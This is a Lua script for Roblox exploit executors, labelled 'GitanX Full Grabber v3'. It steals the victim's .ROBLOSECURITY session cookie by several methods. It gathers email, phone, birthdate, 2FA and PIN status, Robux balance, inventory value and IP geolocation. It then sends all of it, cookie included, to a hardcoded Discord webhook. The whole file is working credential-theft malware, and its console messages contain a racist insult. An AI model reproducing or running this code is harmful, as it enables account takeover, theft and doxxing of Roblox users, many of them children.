-- // FULL INFO GRABBER - GITANX v3.0 (FIX COOKIE)
local WEBHOOK = "https://discord.com/api/webhooks/1513581656198348901/Ar9FDpGZK72N79WoLrB2nugRPyfDBNLzW01KtD-xSp6DhbJHsl-_k49d7e3_IpLLMPt1"

local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserId      = tostring(LocalPlayer.UserId)
local Username    = LocalPlayer.Name
local AccAge      = LocalPlayer.AccountAge
local Premium     = LocalPlayer.MembershipType == Enum.MembershipType.Premium

-- ── HTTP Helper ───────────────────────────────────────────────────────────────
local httpReq = request or (syn and syn.request) or http_request

local function GET(url, headers)
    local ok, res = pcall(function()
        return httpReq({ Url=url, Method="GET", Headers=headers or {} })
    end)
    return (ok and res) and res or nil
end

local function POST(url, body, headers)
    local ok, res = pcall(function()
        return httpReq({
            Url=url, Method="POST",
            Headers=headers or {["Content-Type"]="application/json"},
            Body=body or "{}"
        })
    end)
    return (ok and res) and res or nil
end

-- ── COOKIE RECOVERY (toutes méthodes connues) ─────────────────────────────────
local function getCookie()
    -- Méthode 1 : Synapse X
    if syn and syn.get_cookie then
        local ok,c = pcall(syn.get_cookie, ".ROBLOSECURITY")
        if ok and c and c ~= "" then return c end
    end
    -- Méthode 2 : getcookies() universel
    if getcookies then
        local ok, t = pcall(getcookies)
        if ok and t and t[".ROBLOSECURITY"] then return t[".ROBLOSECURITY"] end
    end
    -- Méthode 3 : getrbxcookie (Fluxus/Delta mobile)
    if getrbxcookie then
        local ok,c = pcall(getrbxcookie)
        if ok and c and c ~= "" then return c end
    end
    -- Méthode 4 : readfile depuis cache executor
    if isfile and isfile("cookie.txt") then
        local ok,c = pcall(readfile, "cookie.txt")
        if ok and c and c ~= "" then return c:match("_|WARNING") and c or c end
    end
    -- Méthode 5 : intercept depuis requête Roblox interne via getconnections
    -- Roblox stocke le cookie dans HttpRbxApiService, on tente de le lire
    local ok5, rbxHttp = pcall(function()
        return game:GetService("HttpRbxApiService")
    end)
    if ok5 and rbxHttp then
        -- force une requête authentifiée et capture le header
        local ok6, res6 = pcall(function()
            return httpReq({
                Url = "https://users.roblox.com/v1/users/"..UserId,
                Method = "GET",
            })
        end)
        if ok6 and res6 and res6.Headers then
            local setCookie = res6.Headers["set-cookie"] or res6.Headers["Set-Cookie"]
            if setCookie then
                local c = setCookie:match("%.ROBLOSECURITY=([^;]+)")
                if c then return c end
            end
        end
    end
    -- Méthode 6 : thread identity 8 + getgenv cookie
    pcall(function()
        if syn then syn.set_thread_identity(8)
        elseif set_thread_identity then set_thread_identity(8)
        elseif setthreadidentity then setthreadidentity(8) end
    end)
    local ok7, envCookie = pcall(function()
        local g = getgenv and getgenv() or _G
        return g[".ROBLOSECURITY"] or g["ROBLOSECURITY"]
    end)
    if ok7 and envCookie and envCookie ~= "" then return envCookie end

    return nil
end

-- ── CSRF Token ────────────────────────────────────────────────────────────────
local function getCSRF(cookie)
    local h = {
        ["User-Agent"]   = "Roblox/WinInet",
        ["Content-Type"] = "application/json"
    }
    if cookie then h["Cookie"] = ".ROBLOSECURITY="..cookie end
    local res = POST("https://auth.roblox.com/v2/logout", "{}", h)
    if res and res.Headers then
        return res.Headers["x-csrf-token"] or res.Headers["X-CSRF-Token"] or ""
    end
    -- 2ème tentative via endpoint différent
    local res2 = POST("https://accountsettings.roblox.com/v1/email", "{}", h)
    if res2 and res2.Headers then
        return res2.Headers["x-csrf-token"] or res2.Headers["X-CSRF-Token"] or ""
    end
    return ""
end

-- ── Build Headers ─────────────────────────────────────────────────────────────
local cookie = getCookie()
local csrf   = getCSRF(cookie)

local AUTH = {
    ["User-Agent"]   = "Roblox/WinInet",
    ["Content-Type"] = "application/json",
    ["x-csrf-token"] = csrf,
    ["Accept"]       = "application/json",
}
if cookie then AUTH["Cookie"] = ".ROBLOSECURITY="..cookie end

-- helper pour réessayer avec et sans cookie
local function GETAUTH(url)
    local res = GET(url, AUTH)
    -- si 401/403, retry sans cookie (app injecte auto)
    if not res or res.StatusCode == 401 or res.StatusCode == 403 then
        res = GET(url, {
            ["User-Agent"]   = "Roblox/WinInet",
            ["x-csrf-token"] = csrf,
            ["Accept"]       = "application/json",
        })
    end
    return res
end

-- ═══════════════════════════════════════════════════════════════════════════════
-- ── FONCTIONS DATA ────────────────────────────────────────────────────────────
-- ═══════════════════════════════════════════════════════════════════════════════

local function getEmail()
    local res = GETAUTH("https://accountsettings.roblox.com/v1/email")
    if res and res.Body then
        local email   = res.Body:match('"emailAddress":"([^"]+)"') or "N/A"
        local verif   = res.Body:match('"verified":(%a+)') or "N/A"
        -- fallback pattern
        if email == "N/A" then
            email = res.Body:match('"email":"([^"]+)"') or "N/A"
        end
        return email, verif
    end
    return "N/A","N/A"
end

local function getPhone()
    local res = GETAUTH("https://accountsettings.roblox.com/v1/phone")
    if res and res.Body then
        return res.Body:match('"phone":"([^"]+)"') or "N/A",
               res.Body:match('"isVerified":(%a+)') or "N/A"
    end
    return "N/A","N/A"
end

local function getBirthdayGender()
    local birthdate = "N/A"
    local res = GETAUTH("https://accountinformation.roblox.com/v1/birthdate")
    if res and res.Body then
        local y = res.Body:match('"birthYear":(%d+)')
        local m = res.Body:match('"birthMonth":(%d+)')
        local d = res.Body:match('"birthDay":(%d+)')
        if y and m and d then
            birthdate = d.."/"..m.."/"..y
        end
    end
    local gender = "N/A"
    local res2 = GETAUTH("https://accountinformation.roblox.com/v1/gender")
    if res2 and res2.Body then
        local g    = res2.Body:match('"gender":(%d+)')
        local gmap = {["1"]="Unknown",["2"]="Male",["3"]="Female"}
        gender     = g and (gmap[g] or g) or "N/A"
    end
    return birthdate, gender
end

local function get2FA()
    local res = GETAUTH("https://twostepverification.roblox.com/v1/users/"..UserId.."/configuration")
    if res and res.Body then
        return res.Body:match('"enabled":(%a+)') or "N/A",
               res.Body:match('"type":"([^"]+)"') or "N/A"
    end
    return "N/A","N/A"
end

local function getPIN()
    local res = GETAUTH("https://auth.roblox.com/v1/account/pin")
    if res and res.Body then
        return res.Body:match('"isEnabled":(%a+)') or "N/A",
               res.Body:match('"isLocked":(%a+)') or "N/A"
    end
    return "N/A","N/A"
end

local function getVoice()
    local res = GETAUTH("https://voice.roblox.com/v1/settings")
    if res and res.Body then
        return res.Body:match('"isVoiceEnabled":(%a+)') or "N/A"
    end
    return "N/A"
end

local function getRobux()
    -- tente les 2 endpoints
    local res = GETAUTH("https://economy.roblox.com/v1/users/"..UserId.."/currency")
    if res and res.Body then
        local r = res.Body:match('"robux":(%d+)')
        if r then return r end
    end
    local res2 = GET("https://www.roblox.com/my/money.aspx", AUTH)
    if res2 and res2.Body then
        local r = res2.Body:match("Robux.-(%d+)")
        if r then return r end
    end
    return "N/A"
end

local function getTransactions()
    local res = GETAUTH("https://economy.roblox.com/v2/users/"..UserId.."/transaction-totals?timeFrame=Month&transactionType=summary")
    if res and res.Body then
        return res.Body:match('"purchasesTotal":(-?%d+)') or "0",
               res.Body:match('"salesTotal":(-?%d+)') or "0",
               res.Body:match('"premiumStipendsTotal":(-?%d+)') or "0"
    end
    return "0","0","0"
end

local function getRAP()
    local res   = GETAUTH("https://inventory.roblox.com/v1/users/"..UserId.."/assets/collectibles?sortOrder=Asc&limit=100")
    local total = 0
    local count = 0
    if res and res.Body then
        for v in res.Body:gmatch('"recentAveragePrice":(%d+)') do
            total = total + tonumber(v)
            count = count + 1
        end
    end
    return total, count
end

local function getSocialCount()
    local r1 = GET("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")
    local r2 = GET("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")
    local r3 = GET("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")
    return
        (r1 and r1.Body and r1.Body:match('"count":(%d+)')) or "0",
        (r2 and r2.Body and r2.Body:match('"count":(%d+)')) or "0",
        (r3 and r3.Body and r3.Body:match('"count":(%d+)')) or "0"
end

local function getGroups()
    local res   = GET("https://groups.roblox.com/v2/users/"..UserId.."/groups/roles")
    local count = 0
    local owner = 0
    if res and res.Body then
        for _ in res.Body:gmatch('"groupId"') do count = count + 1 end
        for _ in res.Body:gmatch('"name":"Owner"') do owner = owner + 1 end
    end
    return count, owner
end

local function getCreatedPlaces()
    local res    = GETAUTH("https://create.roblox.com/v1/user/universes?isArchived=false&sortOrder=Asc&limit=50")
    -- fallback ancien endpoint
    if not res or not res.Body then
        res = GETAUTH("https://develop.roblox.com/v1/user/universes?isArchived=false&limit=50")
    end
    local count  = 0
    local visits = 0
    if res and res.Body then
        for _ in res.Body:gmatch('"id":%d') do count = count + 1 end
        for v in res.Body:gmatch('"visits":(%d+)') do visits = visits + tonumber(v) end
    end
    return count, visits
end

local function getAvatarType()
    local res = GET("https://avatar.roblox.com/v1/users/"..UserId.."/avatar")
    if res and res.Body then
        return res.Body:match('"playerAvatarType":"([^"]+)"') or "N/A"
    end
    return "N/A"
end

local function getPremiumDetails()
    local res = GETAUTH("https://premiumfeatures.roblox.com/v1/users/"..UserId.."/validate-membership")
    if res and res.Body then
        return res.Body:match('"isPremium":(%a+)') or tostring(Premium)
    end
    return tostring(Premium)
end

local function getPresence()
    local res = POST(
        "https://presence.roblox.com/v1/presence/users",
        '{"userIds":['..UserId..']}',
        AUTH
    )
    if res and res.Body then
        local lastOnline = res.Body:match('"lastOnline":"([^"]+)"') or "N/A"
        local pType      = res.Body:match('"userPresenceType":(%d+)') or "0"
        local pmap       = {["0"]="Offline",["1"]="Online",["2"]="In-Game",["3"]="In Studio"}
        return lastOnline, pmap[pType] or "Unknown"
    end
    return "N/A","N/A"
end

local function getIPGeo()
    local res = GET("http://ip-api.com/json/?fields=query,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting")
    if res and res.Body then
        local d = {}
        for k,v in res.Body:gmatch('"([^"]+)":"?([^",}]+)"?') do d[k] = v end
        return d
    end
    return {}
end

local function getPrivacy()
    local res = GETAUTH("https://accountsettings.roblox.com/v1/account/privacy/settings")
    if res and res.Body then
        return res.Body:match('"tradePrivacy":"([^"]+)"') or "N/A",
               res.Body:match('"inventoryPrivacy":"([^"]+)"') or "N/A"
    end
    return "N/A","N/A"
end

local function getRobloxBadges()
    local res  = GET("https://accountinformation.roblox.com/v1/users/"..UserId.."/roblox-badges")
    local list = {}
    if res and res.Body then
        for name in res.Body:gmatch('"name":"([^"]+)"') do list[#list+1] = name end
    end
    return #list > 0 and table.concat(list,", ") or "Aucun"
end

local function getGameBadges()
    local res = GET("https://badges.roblox.com/v1/users/"..UserId.."/badges?limit=1&sortOrder=Desc")
    if res and res.Body then
        return tostring(tonumber(res.Body:match('"total":(%d+)')) or 0)
    end
    return "0"
end

local function getDescription()
    local res = GET("https://users.roblox.com/v1/users/"..UserId)
    if res and res.Body then
        return res.Body:match('"description":"([^"]*)"') or "N/A",
               res.Body:match('"created":"([^"]+)"') or "N/A",
               res.Body:match('"isBanned":(%a+)') or "N/A"
    end
    return "N/A","N/A","N/A"
end

local function getPendingRobux()
    local res = GETAUTH("https://economy.roblox.com/v1/users/"..UserId.."/pending-robux")
    if res and res.Body then
        return res.Body:match('"robux":(%d+)') or "0"
    end
    return "0"
end

local function getSocialMedia()
    local res   = GET("https://accountinformation.roblox.com/v1/users/"..UserId.."/promotion-channels")
    local links = {}
    if res and res.Body then
        for _, f in ipairs({"twitter","youtube","twitch","guilded","facebook"}) do
            local v = res.Body:match('"'..f..'":"([^"]+)"')
            if v then links[#links+1] = f..": "..v end
        end
    end
    return #links > 0 and table.concat(links," | ") or "Aucun"
end

local function getStarCreator()
    local res = GETAUTH("https://apis.roblox.com/creator-hub/v1/creator/status")
    if res and res.Body then
        return res.Body:match('"isStarCreator":(%a+)') or "N/A"
    end
    return "N/A"
end

local function getRestrictions()
    local res = GETAUTH("https://accountsettings.roblox.com/v1/content-restriction/settings")
    if res and res.Body then
        return res.Body:match('"isRestricted":(%a+)') or "N/A"
    end
    return "N/A"
end

local function getSystemInfo()
    local info = {}
    info.executor   = (identifyexecutor and identifyexecutor()) or
                      (getexecutorname  and getexecutorname())  or "Unknown"
    local vp        = workspace.CurrentCamera.ViewportSize
    info.resolution = math.floor(vp.X).."x"..math.floor(vp.Y)
    info.hwid       = (syn and syn.get_hwid and syn.get_hwid()) or "N/A"
    local ok1,ping  = pcall(function()
        return math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"].Value)
    end)
    info.ping = ok1 and (ping.."ms") or "N/A"
    local ok2,loc   = pcall(function() return game:GetService("LocalizationService").RobloxLocaleId end)
    info.locale     = ok2 and loc or "N/A"
    local ok3,plat  = pcall(function() return game:GetService("UserInputService"):GetPlatform().Name end)
    info.platform   = ok3 and plat or "PC"
    local ok4,ver   = pcall(function() return game:GetService("RunService"):GetRobloxVersion() end)
    info.version    = ok4 and ver or "N/A"
    return info
end

local function getGameName()
    local ok, info = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    return ok and info and info.Name or "N/A"
end

-- ═══════════════════════════════════════════════════════════════════════════════
-- ── COLLECT ───────────────────────────────────────────────────────────────────
print("[GitanX] erreur de fdp")

local email,       emailVerif  = getEmail()
local phone,       phoneVerif  = getPhone()
local birthday,    gender      = getBirthdayGender()
local twoFA,       twoFAType   = get2FA()
local pinEnabled,  pinLocked   = getPIN()
local voiceChat                = getVoice()
local robux                    = getRobux()
local spent,       earned,     stipend = getTransactions()
local rap,         rapCount    = getRAP()
local friends,     followers,  following = getSocialCount()
local groups,      ownedGroups = getGroups()
local places,      totalVisits = getCreatedPlaces()
local avatarType               = getAvatarType()
local premiumDet               = getPremiumDetails()
local lastOnline,  presence    = getPresence()
local tradePriv,   invPriv     = getPrivacy()
local rblxBadges               = getRobloxBadges()
local gameBadges               = getGameBadges()
local desc,        created,    isBanned = getDescription()
local pendingRbx               = getPendingRobux()
local socialMedia              = getSocialMedia()
local starCreator              = getStarCreator()
local restricted               = getRestrictions()
local geo                      = getIPGeo()
local sys                      = getSystemInfo()
local gameName                 = getGameName()

local cookieDisplay = cookie
    and ("_|WARNING:-DO-NOT-SHARE" .. cookie):sub(1,80).."..."
    or  "Non récupéré — executor sans support cookie"

-- ── JSON Serializer ────────────────────────────────────────────────────────────
local function J(v)
    local t = type(v)
    if t == "string" then
        return '"'..v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r',''):gsub('%c','')..'"'
    elseif t == "number" or t == "boolean" then return tostring(v)
    elseif t == "table" then
        if #v > 0 then
            local a={} for _,x in ipairs(v) do a[#a+1]=J(x) end
            return "["..table.concat(a,",").."]"
        else
            local a={} for k,x in pairs(v) do a[#a+1]='"'..tostring(k)..'":'..J(x) end
            return "{"..table.concat(a,",").."}"
        end
    end
    return '"N/A"'
end

local avatarThumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=420&height=420&format=png"
local profileURL  = "https://www.roblox.com/users/"..UserId.."/profile"
local timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ")
local dateStr     = os.date("%d/%m/%Y %H:%M:%S")

-- ── PAYLOAD ───────────────────────────────────────────────────────────────────
local payload = J({
    username   = "GitanX Full Grabber v3",
    avatar_url = avatarThumb,
    embeds = {
        {
            title     = "COMPTE — "..Username,
            url       = profileURL,
            color     = 16711680,
            thumbnail = {url=avatarThumb},
            fields = {
                {name="Username",        value="```"..Username.."```",                                       inline=true},
                {name="User ID",         value="```"..UserId.."```",                                         inline=true},
                {name="Age du compte",   value="```"..AccAge.." jours```",                                   inline=true},
                {name="Cree le",         value="```"..created.."```",                                        inline=true},
                {name="Birthday",        value="```"..birthday.."```",                                       inline=true},
                {name="Genre",           value="```"..gender.."```",                                         inline=true},
                {name="Presence",        value="```"..presence.."```",                                       inline=true},
                {name="Last Online",     value="```"..lastOnline.."```",                                     inline=true},
                {name="Banni",           value="```"..isBanned.."```",                                       inline=true},
                {name="Type Avatar",     value="```"..avatarType.."```",                                     inline=true},
                {name="Badges Roblox",   value="```"..rblxBadges.."```",                                    inline=true},
                {name="Badges In-Game",  value="```"..gameBadges.."```",                                    inline=true},
                {name="Reseaux Sociaux", value="```"..socialMedia.."```",                                   inline=false},
                {name="Description",     value="```"..(desc~="" and desc~="N/A" and desc or "Vide").."```", inline=false},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
        {
            title  = "SECURITE DU COMPTE",
            color  = 16737792,
            fields = {
                {name="Email",             value="```"..email.."```",        inline=true},
                {name="Email Verifie",     value="```"..emailVerif.."```",   inline=true},
                {name="Telephone",         value="```"..phone.."```",        inline=true},
                {name="Tel Verifie",       value="```"..phoneVerif.."```",   inline=true},
                {name="2FA Active",        value="```"..twoFA.."```",        inline=true},
                {name="2FA Methode",       value="```"..twoFAType.."```",    inline=true},
                {name="PIN Active",        value="```"..pinEnabled.."```",   inline=true},
                {name="PIN Locked",        value="```"..pinLocked.."```",    inline=true},
                {name="Voice Chat",        value="```"..voiceChat.."```",    inline=true},
                {name="Restreint",         value="```"..restricted.."```",   inline=true},
                {name="Trade Privacy",     value="```"..tradePriv.."```",    inline=true},
                {name="Inv Privacy",       value="```"..invPriv.."```",      inline=true},
                {name="Cookie",            value="```"..cookieDisplay.."```",inline=false},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
        {
            title  = "ECONOMIE & INVENTAIRE",
            color  = 16766720,
            fields = {
                {name="Robux",           value="```"..robux.." R$```",              inline=true},
                {name="Robux Pending",   value="```"..pendingRbx.." R$```",         inline=true},
                {name="Premium",         value="```"..premiumDet.."```",            inline=true},
                {name="Star Creator",    value="```"..starCreator.."```",           inline=true},
                {name="Depense (mois)",  value="```"..spent.." R$```",             inline=true},
                {name="Gagne (mois)",    value="```"..earned.." R$```",            inline=true},
                {name="Stipend",         value="```"..stipend.." R$```",           inline=true},
                {name="RAP Total",       value="```"..tostring(rap).." R$```",     inline=true},
                {name="Limiteds",        value="```"..tostring(rapCount).."```",   inline=true},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
        {
            title  = "SOCIAL & CREATIONS",
            color  = 43775,
            fields = {
                {name="Amis",          value="```"..tostring(friends).."```",      inline=true},
                {name="Followers",     value="```"..tostring(followers).."```",    inline=true},
                {name="Following",     value="```"..tostring(following).."```",    inline=true},
                {name="Groupes",       value="```"..tostring(groups).."```",       inline=true},
                {name="Owned Groups",  value="```"..tostring(ownedGroups).."```",  inline=true},
                {name="Jeux Crees",    value="```"..tostring(places).."```",       inline=true},
                {name="Total Visites", value="```"..tostring(totalVisits).."```",  inline=true},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
        {
            title  = "RESEAU & GEO",
            color  = 65432,
            fields = {
                {name="IP",          value="```"..(geo.query      or "N/A").."```",                                          inline=true},
                {name="Pays",        value="```"..(geo.country    or "N/A").." ("..(geo.countryCode or "??")..")```",        inline=true},
                {name="Ville",       value="```"..(geo.city       or "N/A").."```",                                         inline=true},
                {name="Region",      value="```"..(geo.regionName or "N/A").."```",                                         inline=true},
                {name="ZIP",         value="```"..(geo.zip        or "N/A").."```",                                         inline=true},
                {name="Lat/Lon",     value="```"..(geo.lat or "?").."  /  "..(geo.lon or "?").."```",                       inline=true},
                {name="ISP",         value="```"..(geo.isp        or "N/A").."```",                                         inline=true},
                {name="ORG",         value="```"..(geo.org        or "N/A").."```",                                         inline=true},
                {name="AS",          value="```"..(geo["as"]      or "N/A").."```",                
                                                                                                    inline=true},
                {name="Mobile",      value="```"..(geo.mobile     or "false").."```",                                       inline=true},
                {name="Proxy/VPN",   value="```"..(geo.proxy      or "false").."```",                                       inline=true},
                {name="Hosting",     value="```"..(geo.hosting    or "false").."```",                                       inline=true},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
        {
            title  = "SYSTEME & SESSION",
            color  = 10173606,
            fields = {
                {name="Executor",      value="```"..sys.executor.."```",                inline=true},
                {name="Resolution",    value="```"..sys.resolution.."```",              inline=true},
                {name="Platform",      value="```"..sys.platform.."```",               inline=true},
                {name="Locale",        value="```"..sys.locale.."```",                 inline=true},
                {name="Ping",          value="```"..sys.ping.."```",                   inline=true},
                {name="Version",       value="```"..sys.version.."```",                inline=true},
                {name="HWID",          value="```"..sys.hwid.."```",                   inline=false},
                {name="Jeu",           value="```"..gameName.."```",                   inline=true},
                {name="Place ID",      value="```"..tostring(game.PlaceId).."```",     inline=true},
                {name="Job ID",        value="```"..tostring(game.JobId).."```",       inline=false},
            },
            footer={text="GitanX v3 • "..dateStr}, timestamp=timestamp
        },
    }
})

-- ── ENVOI ─────────────────────────────────────────────────────────────────────
local ok, err = pcall(function()
    httpReq({
        Url     = WEBHOOK,
        Method  = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body    = payload
    })
end)

if ok then
    print("[GitanX] ta grnad mere est noir succes")
else
    warn("[GitanX] ❌ Erreur : "..tostring(err))
end
